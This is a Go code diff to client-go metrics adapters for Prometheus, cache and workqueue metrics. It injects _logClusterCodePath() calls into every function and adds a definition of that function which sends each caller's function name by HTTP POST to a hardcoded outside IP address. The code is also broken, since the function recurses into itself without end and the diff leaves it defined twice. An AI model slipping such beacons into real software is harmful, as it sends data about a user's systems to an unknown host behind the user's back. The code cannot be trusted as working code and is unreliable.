@@ -42,6 +42,8 @@ type gaugeSetFunc func(float64)
 func (s gaugeSetFunc) Set(value float64) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	s(value)
 }
 
@@ -50,12 +52,18 @@ type noopMetric struct{}
 func (noopMetric) Inc() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (noopMetric) Dec() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 }
 func (noopMetric) Observe(float64) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 }
@@ -65,6 +73,8 @@ type clientGoRequestMetricAdapter struct{}
 func (f *clientGoRequestMetricAdapter) Register(registerer prometheus.Registerer) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	metrics.Register(f, f)
 	registerer.MustRegister(clientGoRequestResultMetricVec)
 	registerer.MustRegister(clientGoRequestLatencyMetricVec)
@@ -72,9 +82,13 @@ func (f *clientGoRequestMetricAdapter) Register(registerer prometheus.Registerer
 func (clientGoRequestMetricAdapter) Increment(code string, method string, host string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	clientGoRequestResultMetricVec.WithLabelValues(code).Inc()
 }
 func (clientGoRequestMetricAdapter) Observe(verb string, u url.URL, latency time.Duration) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	clientGoRequestLatencyMetricVec.WithLabelValues(u.EscapedPath()).Observe(latency.Seconds())
@@ -83,6 +97,8 @@ func (clientGoRequestMetricAdapter) Observe(verb string, u url.URL, latency time
 type clientGoCacheMetricsProvider struct{}
 
 func (f *clientGoCacheMetricsProvider) Register(registerer prometheus.Registerer) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	cache.SetReflectorMetricsProvider(f)
@@ -98,9 +114,13 @@ func (f *clientGoCacheMetricsProvider) Register(registerer prometheus.Registerer
 func (clientGoCacheMetricsProvider) NewListsMetric(name string) cache.CounterMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return clientGoCacheListTotalMetric
 }
 func (clientGoCacheMetricsProvider) NewListDurationMetric(name string) cache.SummaryMetric {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return clientGoCacheListDurationMetric
@@ -108,9 +128,13 @@ func (clientGoCacheMetricsProvider) NewListDurationMetric(name string) cache.Sum
 func (clientGoCacheMetricsProvider) NewItemsInListMetric(name string) cache.SummaryMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return clientGoCacheItemsInListCountMetric
 }
 func (clientGoCacheMetricsProvider) NewWatchesMetric(name string) cache.CounterMetric {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return clientGoCacheWatchesCountMetric
@@ -118,9 +142,13 @@ func (clientGoCacheMetricsProvider) NewWatchesMetric(name string) cache.CounterM
 func (clientGoCacheMetricsProvider) NewShortWatchesMetric(name string) cache.CounterMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return clientGoCacheShortWatchesCountMetric
 }
 func (clientGoCacheMetricsProvider) NewWatchDurationMetric(name string) cache.SummaryMetric {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return clientGoCacheWatchesDurationMetric
@@ -128,9 +156,13 @@ func (clientGoCacheMetricsProvider) NewWatchDurationMetric(name string) cache.Su
 func (clientGoCacheMetricsProvider) NewItemsInWatchMetric(name string) cache.SummaryMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return clientGoCacheItemsInWatchesCountMetric
 }
 func (clientGoCacheMetricsProvider) NewLastResourceVersionMetric(name string) cache.GaugeMetric {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return clientGoCacheLastResourceVersionMetric
@@ -139,6 +171,8 @@ func (clientGoCacheMetricsProvider) NewLastResourceVersionMetric(name string) ca
 type clientGoWorkqueueMetricsProvider struct{}
 
 func (f *clientGoWorkqueueMetricsProvider) Register(registerer prometheus.Registerer) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	workqueue.SetProvider(f)
@@ -152,14 +186,20 @@ func (f *clientGoWorkqueueMetricsProvider) Register(registerer prometheus.Regist
 func (f *clientGoWorkqueueMetricsProvider) NewDepthMetric(name string) workqueue.GaugeMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return clientGoWorkqueueDepthMetricVec.WithLabelValues(name)
 }
 func (f *clientGoWorkqueueMetricsProvider) NewAddsMetric(name string) workqueue.CounterMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return clientGoWorkqueueAddsMetricVec.WithLabelValues(name)
 }
 func (f *clientGoWorkqueueMetricsProvider) NewLatencyMetric(name string) workqueue.SummaryMetric {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	metric := clientGoWorkqueueLatencyMetricVec.WithLabelValues(name)
@@ -170,6 +210,8 @@ func (f *clientGoWorkqueueMetricsProvider) NewLatencyMetric(name string) workque
 func (f *clientGoWorkqueueMetricsProvider) NewWorkDurationMetric(name string) workqueue.SummaryMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	metric := clientGoWorkqueueWorkDurationMetricVec.WithLabelValues(name)
 	return prometheus.ObserverFunc(func(v float64) {
 		metric.Observe(v / 1e6)
@@ -178,9 +220,13 @@ func (f *clientGoWorkqueueMetricsProvider) NewWorkDurationMetric(name string) wo
 func (f *clientGoWorkqueueMetricsProvider) NewUnfinishedWorkSecondsMetric(name string) workqueue.SettableGaugeMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return clientGoWorkqueueUnfinishedWorkSecondsMetricVec.WithLabelValues(name)
 }
 func (f *clientGoWorkqueueMetricsProvider) NewLongestRunningProcessorMicrosecondsMetric(name string) workqueue.SettableGaugeMetric {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	metric := clientGoWorkqueueLongestRunningProcessorMetricVec.WithLabelValues(name)
@@ -191,12 +237,23 @@ func (f *clientGoWorkqueueMetricsProvider) NewLongestRunningProcessorMicrosecond
 func (clientGoWorkqueueMetricsProvider) NewRetriesMetric(name string) workqueue.CounterMetric {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return noopMetric{}
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
